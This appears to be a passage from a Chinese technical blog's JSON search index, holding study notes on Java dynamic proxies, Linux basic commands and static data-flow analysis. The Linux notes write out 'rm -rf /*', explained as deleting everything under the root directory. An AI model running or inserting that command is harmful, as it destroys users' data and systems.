总结反射，永远滴神！","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java反射","slug":"Java反射","permalink":"https://0range228.github.io/tags/Java%E5%8F%8D%E5%B0%84/"}]},{"title":"动态代理那点事","slug":"动态代理那点事","date":"2020-04-10T09:05:06.000Z","updated":"2021-06-06T08:42:54.179Z","comments":true,"path":"动态代理那点事/","link":"","permalink":"https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/","excerpt":"序言今天来总结Java代理。分为静态和动态。","text":"序言今天来总结Java代理。分为静态和动态。 什么是代理？定义给目标对象提供一个代理对象，并由代理对象控制目标对象的引用。 目的 通过引入代理对象的方式来简介访问目标对象，防止直接访问目标对象给系统带来的不必要复杂性； 通过代理对象对原有的业务增强； 注意事项 代理对象和真实对象必须实现同一个接口； 代理对象只是搬运工，代理对象必须包含真实的对象； 代理模式给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。 代理模式是一种结构型设计模式。 代理模式角色分为 3 种： Subject(接口)： 定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法，其实就是一个功能接口； RealSubject（真实类）：真正实现业务逻辑的类，这就是真实的对象； Proxy（代理类）：用来代理和封装真实主题； 三者关系如图所示： 如果根据字节码的创建时机来分类，可以分为静态代理和动态代理： 所谓静态也就是在程序运行前就已经存在代理类的字节码文件，代理类和真实主题角色的关系在运行前就确定了。 而动态代理的源码是在程序运行期间由JVM根据反射等机制动态的生成，所以在运行前并不存在代理类的字节码文件。（这个很牛逼） 静态代理下面写个小demo看一下。 编写一个接口 UserService ，以及该接口的一个实现类 UserServiceImpl： 接口 UserService： 1234public interface UserService &#123; public void select(); public void update();&#125; 接口实现类UserServiceImpl： 12345678public class UserServiceImpl implements UserService &#123; public void select() &#123; System.out.println(\"查询 selectById\"); &#125; public void update() &#123; System.out.println(\"更新 update\"); &#125;&#125; 代理类UserServiceProxy： 12345678910111213141516171819202122232425public class UserServiceProxy implements UserService&#123; private UserService target; // 包含被代理的对象 public UserServiceProxy(UserService target) &#123; this.target = target; &#125; public void select() &#123; before(); target.select(); // 这里才实际调用真实主题角色的方法 after(); &#125; public void update() &#123; before(); target.update(); // 这里才实际调用真实主题角色的方法 after(); &#125; private void before() &#123; // 在执行方法之前执行 System.out.println(String.format(\"log start time [%s] \", new Date())); &#125; private void after() &#123; // 在执行方法之后执行 System.out.println(String.format(\"log end time [%s] \", new Date())); &#125;&#125; 写一个客户端： 123456789public class Client &#123; public static void main(String[] args)&#123; UserService user = (UserService) new UserServiceImpl(); UserService proxy = new UserServiceProxy(user); //调用代理实现类实现的方法 proxy.select(); proxy.update(); &#125;&#125; 输出结果： 12345678log start time [Mon Apr 13 21:28:09 CST 2020] 查询 selectByIdlog end time [Mon Apr 13 21:28:09 CST 2020] log start time [Mon Apr 13 21:28:09 CST 2020] 更新 updatelog end time [Mon Apr 13 21:28:09 CST 2020] Process finished with exit code 0 模板： 1234接口 obj = new 接口实现类（）；代理类 proxy = new 代理类（obj）；proxy.method_a();proxy.method_b(); 静态代理的缺点虽然静态代理实现简单，且不侵入原代码，但是，当场景稍微复杂一些的时候，静态代理的缺点也会暴露出来。 1/当需要代理多个类的时候，由于代理对象要实现与目标对象一致的接口，有两种方式： 只维护一个代理类，由这个代理类实现多个接口，但是这样就导致代理类过于庞大 新建多个代理类，每个目标对象对应一个代理类，但是这样会产生过多的代理类 2/当接口需要增加、删除、修改方法的时候，目标对象与代理类都要同时修改，不易维护。 动态代理为什么类可以动态的生成？Java虚拟机类加载过程主要分为五个阶段：加载、验证、准备、解析、初始化。其中加载阶段需要完成以下3件事情： 通过一个类的全限定名来获取定义此类的二进制字节流 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构 在内存中生成一个代表这个类的 java.lang.Class 对象，作为方法区这个类的各种数据访问入口 由于虚拟机规范对这3点要求并不具体，所以实际的实现是非常灵活的，关于第1点，获取类的二进制字节流（class字节码）就有很多途径： 从ZIP包获取，这是JAR、EAR、WAR等格式的基础 从网络中获取，典型的应用是 Applet 运行时计算生成，这种场景使用最多的是动态代理技术，在 java.lang.reflect.Proxy 类中，就是用了 ProxyGenerator.generateProxyClass 来为特定接口生成形式为 *$Proxy 的代理类的二进制字节流 由其它文件生成，典型应用是JSP，即由JSP文件生成对应的Class类 从数据库中获取等等 所以，动态代理就是想办法，根据接口或目标对象，计算出代理类的字节码，然后再加载到JVM中使用。但是如何计算？如何生成？情况也许比想象的复杂得多，我们需要借助现有的方案。 JDK动态代理两个核心类创建动态代理类会使用到 java.lang.reflect.Proxy类 和 java.lang.reflect.InvocationHandler接口。 目标类必须实现接口，没有接口只能用CGLIB。 java.lang.reflect.Proxy主要用于生成动态代理类Class、创建代理类实例，该类实现了java.io.Serializable接口。 Proxy 是类，是调度器，帮助调度服务的员工，是所有动态代理的父类，它只管new实例出来，别的不插手。 InvocationHandler 是接口，用于调用Proxy类生成的代理类方法，该类只有一个invoke方法。 只管“new的实例”的执行功能，别的不插手。 在程序运行过程中产生的代理类的对象，其实就是通过反射机制来生成的。 JDK提供的代理只能针对接口做代理。 每一个动态代理类都必须要实现InvocationHandler这个接口。 它的invoke方法表示代理对象要执行的功能代码。 proxyProxy这个类的作用就是用来动态创建一个代理对象类，它提供了许多的方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172copypackage java.lang.reflect;import java.lang.reflect.InvocationHandler;/** * Creator: yz * Date: 2020/1/15 */public class Proxy implements java.io.Serializable &#123; // 省去成员变量和部分类方法... /** * 获取动态代理处理类对象 * * @param proxy 返回调用处理程序的代理实例 * @return 代理实例的调用处理程序 * @throws IllegalArgumentException 如果参数不是一个代理实例 */ public static InvocationHandler getInvocationHandler(Object proxy) throws IllegalArgumentException &#123; ... &#125; /** * 创建动态代理类实例 * * @param loader 指定动态代理类的类加载器 * @param interfaces 指定动态代理类的类需要实现的接口数组，这里的对象是接口实现类 * @param h 动态代理处理类 * @return 返回动态代理生成的代理类实例 * @throws IllegalArgumentException 不正确的参数异常 */ public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException &#123; ... &#125; /** * 创建动态代理类 * * @param loader 定义代理类的类加载器 * @param interfaces 代理类要实现的接口列表 * @return 用指定的类加载器定义的代理类，它可以实现指定的接口 */ public static Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123; ... &#125; /** * 检测某个类是否是动态代理类 * * @param cl 要测试的类 * @return 如该类为代理类，则为 true，否则为 false */ public static boolean isProxyClass(Class&lt;?&gt; cl) &#123; return java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl); &#125; /** * 向指定的类加载器中定义一个类对象 * * @param loader 类加载器 * @param name 类名 * @param b 类字节码 * @param off 截取开始位置 * @param len 截取长度 * @return JVM创建的类Class对象 */ private static native Class defineClass0(ClassLoader loader, String name, byte[] b, int off, int len);&#125; 其中用的最多的就是 newProxyInstance ()方法： 1234567891011/** * 创建动态代理类实例，也就是创建代理对象 * * @param loader 指定动态代理类的类加载器 * @param interfaces 指定动态代理类的类需要实现的接口数组 * @param h 动态代理处理类 * @return 返回动态代理生成的代理类实例 * @throws IllegalArgumentException 不正确的参数异常 */public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException 这个方法的作用就是得到一个动态代理对象，其中接收三个参数： loader：一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理类对象进行加载； 实现类a，a.getClass().getClassLoader()，获取目标对象的类加载器。 interfaces参数：一个Interface接口对象数组，说明将要给被代理类对象提供一组什么样的接口，如果提供了一组接口给被代理类对象，那么该对象就宣称实现了该接口(多态)，这样就能调用这组接口中的方法了； 目标对象实现的接口，也是反射获取的。a.getClass().getInterfaces() h：一个InvocationHandler对象，表示的是当这个动态代理对象在调用方法的时候，会关联到哪一个InvocationHandler对象上； 是我们自己写的，代理类要完成的功能，体现在invoke函数里。 返回值：就是代理对象。 把三个参数当作原料，加工出来代理对象。 Invocationhandler作为InvocationHandler接口唯一的方法，invoke ()方法定义如下： 1Object invoke(Object proxy, Method method, Object[] args) throws Throwable proxy参数：jdk创建的代理对象，无需赋值； method参数：目标类中的方法； args参数：Method参数中，接收的参数； 以上三个参数都是jdk帮忙创建的，无需人为赋值。 怎么用： 创建一个类，来实现InvocationHandler 重写invoke方法，把原来静态代理中代理类要完成的功能，放在重写之后的invoke方法中实现。 invoke方法表示代理对象要执行的功能代码。 还需要一个Object字段： 12345private Object target;public MyHandler(Object target) &#123; this.target = target;&#125;ret = method.invoke(target,args); newProxyInstance 源码看看java.lang.reflect.Proxy#newProxyInstance里面怎么实现的： 123456789101112131415161718192021222324252627282930313233343536public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException &#123; if (h == null) &#123; throw new NullPointerException(); &#125; /* * Look up or generate the designated proxy class. */ Class&lt;?&gt; cl = getProxyClass0(loader, interfaces); // stack walk magic: do not refactor /* * Invoke its constructor with the designated invocation handler. */ try &#123; final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams); final InvocationHandler ih = h; SecurityManager sm = System.getSecurityManager(); if (sm != null &amp;&amp; ProxyAccessHelper.needsNewInstanceCheck(cl)) &#123; // create proxy instance with doPrivilege as the proxy class may // implement non-public interfaces that requires a special permission return AccessController.doPrivileged(new PrivilegedAction&lt;Object&gt;() &#123; public Object run() &#123; return newInstance(cons, ih); &#125; &#125;); &#125; else &#123; return newInstance(cons, ih); &#125; &#125; catch (NoSuchMethodException e) &#123; throw new InternalError(e.toString()); &#125; &#125; 这里面有一个关键函数是Class&lt;?&gt; cl = getProxyClass0(loader, intfs);，这一步主要就是生成代理类。 JDK会生成一个叫$Proxy0的代理类，这个类文件是放在内存中的，在创建代理类对象时，通过反射机制获得这个类的构造方法，然后创建代理类实例。 动态代理Demo实现动态代理的步骤： 创建接口，定义目标类要完成的功能 创建目标类来实现接口 创建InvocationHandler接口的实现类，在invoke方法中完成代理类的功能 调用目标方法 增强功能 使用Proxy类的newProxyInstance方法，来创建代理对象，代理对象来执行目标方法调用，其实是去执行handler中的invoke方法。invoke方法主要还是做两件事情：1.调用目标方法 2.功能增强。然后invoke返回目标方法执行结果。 这里再写一个代购小demo： 如果说静态代理阶段，我是一个只会提供固定商品的代购，那么现在我强大了，我有一个小公司，我的公司旗下可以代购各种商品，对于代购每一种商品的员工，都有熟练且强大的业务能力。 那么我先写好我的“代购帝国公司”： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;/** * @auther : 0range * @create : 2020 - 04 - 13 - 10:09 下午 */public class LisonCompany implements InvocationHandler &#123; //被代理的对象 private Object factory; public Object getFactory()&#123; return factory; &#125; public void setFactory(Object factory)&#123; this.factory = factory; &#125; //通过Proxy获取动态代理的对象,他是用来调度员工的 public Object getProxyInstance()&#123; return Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),this); &#125;//这里面this就是InvocationHandler //这里就是通过动态代理对象来对方法进行增强 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; dobefore(); //这里就是你要调用什么样的方法，作为参数传给我，我给你invoke Object ret = method.invoke(factory,args); doafter(); return ret; &#125; //售前服务 private void dobefore()&#123; System.out.println(\"售前服务，精美包装，快递一条龙服务！\"); &#125; //售后服务 private void doafter()&#123; System.out.println(\"售后服务，无忧退换货！\"); &#125;&#125; 这之后需要新的功能，只需加类，加接口就可以完成实现。 这里再具体写一下，假设有两个水果工厂： 1234567public interface AppleFactory &#123; public void makeApple();&#125;public interface OrangeFactory &#123; public void makeOrange();&#125; 分别写好对应实现类： 123456789101112public class AppleFactoryImpl implements AppleFactory&#123; @Override public void makeApple()&#123; System.out.println(\"新鲜大苹果！！！\"); &#125;&#125;public class OrangeFactoryImpl implements OrangeFactory &#123; @Override public void makeOrange()&#123; System.out.println(\"新鲜大橙子！！！\"); &#125;&#125; 那么代购客户端这样写： 12345678910111213141516171819202122232425public class FruitClient &#123; public static void main(String[] args) &#123; //苹果工厂实现类 AppleFactory apl = new AppleFactoryImpl(); //代购公司成立了 LisonCompany lisonComp = new LisonCompany(); //代购公司目标是苹果 lisonComp.setFactory(apl); //分配1号员工来负责代购 AppleFactory lison1 = (AppleFactory)lisonComp.getProxyInstance(); //代购苹果 lison1.makeApple(); System.out.println(\"------------------------\"); //橙子工厂实现类 OrangeFactory org = (OrangeFactory) new OrangeFactoryImpl(); //代购公司目标是橙子 lisonComp.setFactory(org); //分配2号员工来负责代购 OrangeFactory lison2 = (OrangeFactory)lisonComp.getProxyInstance(); //代购橙子 lison2.makeOrange(); &#125;&#125; 运行结果： 1234567售前服务，精美包装，快递一条龙服务！新鲜大苹果！！！售后服务，无忧退换货！------------------------售前服务，精美包装，快递一条龙服务！新鲜大橙子！！！售后服务，无忧退换货！ 流程图： 又写了一个好懂的版本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class Buyer &#123; public static void main(String[] args) &#123; Factory realfactory = new FactoryImpl(); InvocationHandler handler = new Company(realfactory); Factory fac = (Factory) Proxy.newProxyInstance(handler.getClass().getClassLoader(),realfactory.getClass().getInterfaces(),handler); fac.make(\"大苹果\"); fac.taste(\"大西瓜\"); &#125;&#125;interface Factory&#123; public void make(String name); public void taste(String name);&#125;class FactoryImpl implements Factory&#123; public void make(String name)&#123; System.out.println(\"[*]买新鲜的\"+name); &#125; public void taste(String name) &#123; System.out.println(\"[*]尝一口\"+name); &#125;&#125;class Company implements InvocationHandler&#123; Object subject; public Company(Object subject) &#123; this.subject = subject; &#125; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(\"来代理咯！\"); method.invoke(subject,args); System.out.println(\"代理完毕咯！\"); return null; &#125;&#125; 结果： 总结JDK 动态代理： 为了解决静态代理中，生成大量的代理类造成的冗余； JDK 动态代理只需要实现 InvocationHandler 接口，重写 invoke 方法便可以完成代理的实现， jdk的代理是利用反射生成代理类 Proxyxx.class 代理类字节码，并生成对象 jdk动态代理之所以只能代理接口是因为代理类本身已经extends了Proxy，而java是不允许多重继承的，但是允许实现多个接口 优点：解决了静态代理中冗余的代理实现类问题。 缺点：JDK 动态代理是基于接口设计实现的，如果没有接口，会抛异常。 通用模式： 1234接口 os = new 接口实现类()；Myhandler h = new Myhandler(os)；//内部重写invoke方法，增强目标方法。接口 proxy = Proxy.newproxyInstance(loader,interfaces,h);proxy.目标方法();","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java动态代理","slug":"Java动态代理","permalink":"https://0range228.github.io/tags/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"}]},{"title":"Linux笔记","slug":"Linux笔记","date":"2020-04-05T11:23:57.000Z","updated":"2021-09-28T10:51:23.427Z","comments":true,"path":"Linux笔记/","link":"","permalink":"https://0range228.github.io/Linux%E7%AC%94%E8%AE%B0/","excerpt":"序言 江山如画，一时多少豪杰。 复习Linux基础知识。","text":"序言 江山如画，一时多少豪杰。 复习Linux基础知识。 GNU/LinuxGNU：基于开源协议，实现UNIX系统中的组件，本质上是工具集合。 Linux：本质是内核，分配计算机资源。 和在一起就是Linux发型版。 家族 Debian Ubuntu Kali RedHat centOS Fedora Linux目录结构/：根目录，所有用户共享的目录，Linux虚拟目录结构只包含/根目录。 ~：家目录，用户的个人目录 #：root $：普通用户 CLI： 文本命令行界面 挂载点：根驱动器上创建的特别的目录，用于分配额外存储设备的目录。 挂载目录实际上存储在另一个驱动器之中。 命令行参数前缀格式主要有三种： Unix风格：- GNU风格：– BSD风格：no dash 常见连接符cmd_a | cmd_b ： a结果作为b的输入 管道符 cmd_a || cmd_b ：a失败再执行b cmd_a &amp;&amp; cmd_b ：a成功后再执行b cmd_a &amp; cmd_b ：a执行后继续执行指令b 外部命令与内建命令外部命令外部命令，也被称为文件系统命令，指的是存在于bash shell之外的程序。它们并不是shell 程序的一部分。外部命令程序通常位于/bin、/usr/bin、/sbin或/usr/sbin中。 ps就是一个外部命令。可以使用which和type命令找到它。 12$ type -a psps is /bin/ps 当外部命令执行时，会创建出一个子进程。这种操作被称为衍生（forking）。外部命令ps很方便显示出它的父进程以及自己所对应的衍生子进程。 内建命令作为shell工具的组成部分存在。不需要借助外部程序文件来运行。 cd和exit命令都内建于bash shell。可以利用type命令来了解某个命令是否是内建的。 12$ type cdcd is a shell builtin 缝合怪命令有些命令由多种实现，例如echo和pwd既有内建命令也有外部命令。 命令type -a显示出了每个命令的两种实现。which命令只显示出了外部命令文件。 要查看命令的不同实现，使用type -a。 12345678910111213$ type -a echo echo is a shell builtin echo is /bin/echo $ which echo /bin/echo $ type -a pwdpwd is a shell builtin pwd is /bin/pwd $ which pwd /bin/pwd 常用命令命令末尾加&amp; 进入后台模式 查看后台作业 jobs -l ls ls [选项] [参数] : ls -l /etc 目录内容查看 选项： -a：显示所有文件（包括隐藏文件） -l：长格式显示；ls -l可以简写成ll 权限 | 引用次数 | user | group | size(bytes) | 最后修改时间 -lh：人类化显示，KB、MB… -ld：查看目录本身的信息 -li：查看文件的inode节点 1234567ls -l my_script # 匹配文件名为my_script 的文件ls -l my_sc?ipt # 代表一个字符 ls -l my* # 代表一个或多个字符 my开头的意思 ls -l my_s*tls -l my_scr[ai]ptls -l my_scr[a-i]ptls -l my_scr[!i]pt # 将script排除在外 mkdir mkdir [选项] [目录名，路径] 创建新目录 选项： -p：迭代创建。在目录本身不存在的情况下，创建新目录(子目录) cd cd [目录路径] ：cd /tmp 切换目录 pwd显示当前目录 . ：当前目录 .. ：上一级目录 cp cp [选项] [源文件目录] [目标文件目录] 复制文件或目录 选项： -r：复制目录 -p：复制目录时保留文件属性（修改时间等信息） 1cp -i /etc/NetworkManager/NetworkManager.conf . # 复制到当前目录 mv mv [源路径] [目标路径] 剪切、重命名 mv只影响位置、名称，时间戳以及inode编号不影响 mv test test1：将目前目录下的文件test改名为test1 mv test1 test2 test3 test4：源路径可以多个一起复制（1，2，3 -&gt; 4) rm rm [选项] [路径] 删除文件或目录 选项： -f：默认强制删除 -r：删除目录 rm -rf /*：将根目录下的一切删除 touch创建空文件 cat cat [选项] [文件路径] 显示文件内容 选项： -n：显示行号 -A：查看所有内容，包含隐藏文件 ls -a ##tac tac [选项] [文件路径] 文件倒着显示，从最后一行倒着显示 more分页显示文件内容 进入浏览状态后： 空格键/f：翻页 enter：逐行显示 q/Q：退出 B/b：返回上一页 less与more相同，但可以用⬆️方向键向上翻页 也可以搜索关键词： /+keyword：寻找关键词，n向下找 ##head head -n 20 /etc/services.conf：查看前20行内容 如果不写-n 20，那么默认显示前10行 tailtail -n 20 /etc/services.conf：查看尾部后20行 如果不写，也是默认后10行 ln ln [选项] [源文件] [目标文件] 选项： -s：创建软链接 软链接：通过文件路径访问，类似快捷方式； 硬链接：通过文件索引地址（inode）访问， ​ 与cp -p不同的是，硬链接可以同步更新 要为一个文件创建符号链接，原始文件必须事先存在。然后可以使用ln -s 来创建符号链接。 chmod chmod [选项] [文件或目录] Type1： ​ [{ugoa}{+-=}{rwx}] [文件或目录] Type2: ​ [mode 421] [文件或目录] 权限管理 -R：递归修改，如果修改目录权限，那么目录内所有的文件都会修改 Type1： u+x：给user增加x权限 g+w：给group增加write权限 o-r：给other去掉read权限 g=rwx：强制给group权限改为read、write、exe Type2： 权限用数字显示 r=4,w=2,x=1 rwxrw-r--：764 chown，chgrp更改文件所属者，更改文件所属组 12chown dan newfilechgrp shared newfile find find [选项] [搜索范围] [匹配条件] 文件搜索 find /etc -name init：在/etc下搜索文件init -iname：不区分大小写 *init*：只要带init就可以 init???：以init开头，后面有三个字符 -type：按类型查找 -type -f/d/l：按照文件/目录/软链接类型查找 which、whereiswhich：找到命令所在的目录 whereis：会附带帮助文档的位置 grep grep [选项] [关键词] [文件名或目录] 搜寻特定行 选项： -i：不区分大小写 -n：显示行号 -v：反向搜索，排除指定字串 ​ grep -v ^# /etc/inittab：不看行首带#注释的行 ps查看进程 常用参数： 1ps -elf # 完整查看所有进程 列含义： UID：启动这些进程的用户id。 PID：进程id。 PPID：父进程id，如果该进程是由另一个进程启动的 F：系统分配给进程的系统标记。 S：进程状态 [O代表正在运行；S代表在休眠；R代表可运行，正等待运行；Z代表僵 化，进程已结束但父进程已不存在；T代表停止] C：进程生命周期中的CPU的利用率。 PRI：进程的优先级 [数字越大优先级越低] ADDR：进程的内存地址。 SZ：假如进程被换出，所需要的交换空间的大小。 STIME：进程的start time。 TTY：进程由哪个终端设备启动。 TIME：进程的累积运行时间。 CMD：启动的程序名称。 top实时显示进程信息 列含义： PID：进程的ID。 USER：进程属主的名字。 PR：进程的优先级。 NI：进程的谦让度值。 VIRT：进程占用的虚拟内存总量。 RES：进程占用的物理内存总量。 SHR：进程和其他进程共享的内存总量。 S：进程的状态（D代表可中断的休眠状态，R代表在运行状态，S代表休眠状态，T代表 跟踪状态或停止状态，Z代表僵化状态 %CPU：进程使用的CPU时间比例。 %MEM：进程使用的内存占可用内存的比例。 TIME+：自进程启动到目前为止的CPU时间总量。 COMMAND：进程所对应的命令行名称，也就是启动的程序名。 默认情况下，top命令在启动时会按照%CPU值对进程排序。可以在top运行时使用多种交互命令重新排序。 键入f允许你选择对输出进行排序的字段，键入d允许你修改轮询间隔。键入q可以退出top。 用户在top 命令的输出上有很大的控制权。 killkill pid Killall http* 关闭http的所有服务 help、who、whelp：查看shell内置命令的帮助手册 who：查看登陆用户信息 w：查看详细登录信息 gzip、gunzip .gz : linux常见的压缩格式 .zip : win、linux都可以识别，解压 gzip 文件名：压缩成.gz格式的压缩文件，压缩后不会保留源文件 gunzip 压缩文件：将.gz文件解压成正常文件 tar tar [-zcvf] [压缩后文件名] [待压缩目录] 压缩目录，先打包，再压缩，格式.tar.gz 选项： -c：打包 -x：解包 -v：显示详细信息 -f：指定文件名 -z：打包同时压缩 zcvf：打包 zxvf：解包 常用命令： 123tar -zcvf test.tar test/ test2/ # 将test/和test2一起打包为test.tartar -tf test.tar # 列出压缩包中的文件tar -xvf test.tar # 解压 zip zip [选项] [压缩后文件名] [压缩目录] ​ -r：压缩目录 shutdownshutdown -h now/date：关机 shutdown -r：重启 shutdown -c：取消上一条命令 history显示bash历史。通常历史记录中会保存最近的1000条命令。 命令历史记录被保存在隐藏文件.bash_history中，它位于用户的主目录中。 这里要注意的是， bash命令的历史记录是先存放在内存中，当shell退出时才被写入到历史文件中。 ！！自动唤出刚刚命令 网络命令tty：本地终端 pts：远程终端 ###write write &lt;用户名&gt; : 给在线用户名发消息，ctrl+D保存结束 wall wall [message] : 广播信息，自己也会收到 ping ping -c : 指定发送次数 ifconfig ifconfig etc0 [ip]： 给eth0配置ip地址 mail mail [用户名]：查看，发送电子邮件 last列出计算机用户登录信息 traceroute traceroute www.baidu.com 显示数据包到主机之间的路径 netstat查询网络状态 选项： -t：TCP -u：UDP -l：监听 -r：路由 -n：显示ip地址和端口号 -a：所有，all 环境变量全局环境变量 ： env命令查看 删除环境变量：unset 持久化放在$HOME/.bashrc中 软件包类别 源码包 C/C++编写，需手动安装 二进制包 经过编译的二进制包，不能再看见源代码 .rpm包：redhat，centOS .ded包：debian，ubuntu shell命令shell两大家族： Bourne shell C sh csh ksh tcsh bash psh zsh 查看支持shell种类：vim /etc/shells echo输出命令 echo -e：支持\\转义 echo -n：合并为一行输出 #! /bin/bash alias alias 别名 = ‘原命令’ 设置命令别名 alias：查询命令别名 unalias：删除别名 history history [选项] [历史命令保存文件] 查看历史命令 选项： -c：清空历史命令 -w：把缓存中的历史命令写入文件 ～/.bash_history：历史命令 wc对数据中的文本进行计数 默认会记录： 文本的行数 文本的词数 文本的字节数 ##tricky skills Ctrl+L 清屏 Ctrl+U 清空光标前命令、剪切 Ctrl+K 清空光标后命令 Ctrl+Y 粘贴 Ctrl+R 在历史命令中搜索 Ctrl+D 退出当前终端 Ctrl+A 光标移至开头 Ctrl+E 光标移至结尾 ##重定向 标准输出重定向： 命令 &gt; 文件 ： 覆盖 命令 &gt;&gt; 文件 ： 追加 不管是否报错都保存： 覆盖：命令 &gt; 文件 2&gt;$1 ​ 命令 &amp;&gt; 文件 追加：命令 &gt;&gt; 文件 2&gt;$1 ​ 命令 &amp;&gt;&gt; 文件 正确保存1，错误保存2： 命令 &gt;&gt; 文件1 2 &gt;&gt; 文件2 ##管道符 命令1 | 命令2 ：命令1的正确输出作为命令2的操作对象 set查看所有命令 unset 多命令顺序执行;：多个命令之间没有任何联系，顺序执行 &amp;&amp;：逻辑与 ​ 当cmd1正确执行，cmd2才会执行 ​ 当cmd1不正确，cmd2不会执行 ||：逻辑或 ​ 当cmd1正确执行，cmd2就不会执行 ​ 当cmd1不正确，cmd2才会执行 例子： 判断命令是否正确： cmd &amp;&amp; echo yes || echo no 脚本安装： ./configure &amp;&amp; make &amp;&amp; make install 通配符匹配文件名 具体含义： ?：匹配任意一个字符，必须得有一个，不包含null *：匹配任意一个或多个任意字符，可以匹配任意内容，null也可以匹配到 []：匹配括号中的任意一个字符，必须得有一个 [-]：[a-z]：匹配任意一个小写字母 [^]：逻辑非，表示匹配不在中括号内的一个字符 ​ [^0-9]：匹配一个任意一个不是0-9数字的字符 其他特殊符号单引号双引号的区别： 123name=scecho '$name' =&gt;$nameecho \"$name\" =&gt;sc $()：用来执行系统命令 abc = $(date)：将date执行，将结果赋值给abc变量的值 shell启动登录shell当你登录Linux系统时，bash shell会作为登录shell启动。登录shell会从5个不同的启动文件里 读取命令： /etc/profile $HOME/.bash_profile $HOME/.bashrc $HOME/.bash_login $HOME/.profile 默认的bash shell的主启动文件，系统上的每个用户登录时都会执行 这个启动文件。 另外4个启动文件是针对用户的，可根据个人需求定制。我们来仔细看一下各个文件。 交互式shell进程当你是在命令行提示符下敲入bash时启动，那 么你启动的shell叫作交互式shell。 交互式shell不会像登录shell一样运行，但它依然提供了命令行提示符来输入命令。 如果bash是作为交互式shell启动的，它就不会访问/etc/profile文件，只会检查用户HOME目录中的.bashrc文件。 非交互式shell进程系统执行shell脚本时用的就是这种shell。不同的地方在于它没有命令行提示符。 但是当你在系统上运行脚本时，也许希望能够运行一些特定启动的命令。 为了处理这种情况，bash shell提供了BASH_ENV环境变量，可以设置 shell的继承如果父shell是登录shell，在/etc/profile、/etc/profile.d/*.sh和$HOME/.bashrc文件中 设置并导出了变量，用于执行脚本的子shell就能够继承这些变量。 Linux文件权限Linux安全系统的核心是用户账户。每个能进入Linux系统的用户都会被分配唯一的用户账户。 用户权限是通过创建用户时分配的用户ID（User ID，通常缩写为UID）来跟踪的。UID是数值，每个用户都有唯一的UID，但在登录系统时用的不是UID，而是登录名。登录名是用户用来登录系统的最长八字符的字符串（字符可以是数字或字母），同时会关联一个对应的密码。 /etc/passwd将用户的登录名匹配到对应的UID值。 root用户账户是Linux系统的管理员，固定分配给它的UID是0 伴随很多系统账户，他们并不是真实存在的。 用户的密码保存在一个特定的文件/etc/passwd /etc/shadow 文件/etc/shadow文件为系统上的每个用户账户都保存了一条记录。只有root用户才能访问/etc/shadow 文件。 用户组组权限允许多个用户对系统中的对象（比如文件、目录或设备等）共享一组共用的权限。 每个组都有唯一的GID——跟UID类似，在系统上这是个唯一的数值。除了GID，每个组还 有唯一的组名。 /etc/group包含系统上用到的每个组的信息。系统账户用的组通常会分配低于500的GID值，而用户组的GID则会从500开始分配。 文件修饰符-rw-r--r--: -|user|group|others 第一个-含义： -：文件 d：目录 l：软链接 n: 网络设备 r,w,x : 可读、可写、可执行 rw-含义： 对象所属的user有read、write权限 r--含义： 对象所属的group只有read权限 r--含义： 其他用户只有read权限 shell脚本编程123456789101112131415161718192021#!/bin/bashdays=10 guest=\"Katie\" echo \"$guest checked in $days days ago\"testing=$(date) testing=`date`echo \"The date and time are: \" $testingdate &gt; result.txtdate &gt;&gt; result.txt #追加today=$(date +%y%m%d) ls -al /usr/bin &gt; log.$todayif command then commands else commandsfi Vim永远滴神","categories":[{"name":"Linux","slug":"Linux","permalink":"https://0range228.github.io/categories/Linux/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://0range228.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"}]},{"title":"静态分析入门笔记02","slug":"静态分析入门笔记02","date":"2020-03-27T12:33:33.000Z","updated":"2020-04-27T13:35:57.810Z","comments":true,"path":"静态分析入门笔记02/","link":"","permalink":"https://0range228.github.io/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B002/","excerpt":"序言 遥望洞庭山水翠，白银盘里一青螺。 这篇梳理数据流分析及相关方法。","text":"序言 遥望洞庭山水翠，白银盘里一青螺。 这篇梳理数据流分析及相关方法。 数据流 Data FlowsCFG上到底是什么在流动？是数据流。 绝大部分静态分析牺牲了completeness。 先讲两点： 对变量进行抽象表达。 over-approcimation：过近似。就是说无论实际函数产生了多么复杂的情况，静态分析时都应该包含每种情况。 may-analysis：绝大部分静态分析，最常见。 Outputs: maybe-true , so -&gt; over-approximation. must-analysis: 为了报出来一定是正确的，那么就必须under-approximation。 Outputs: must be true , so -&gt; under-approximation. 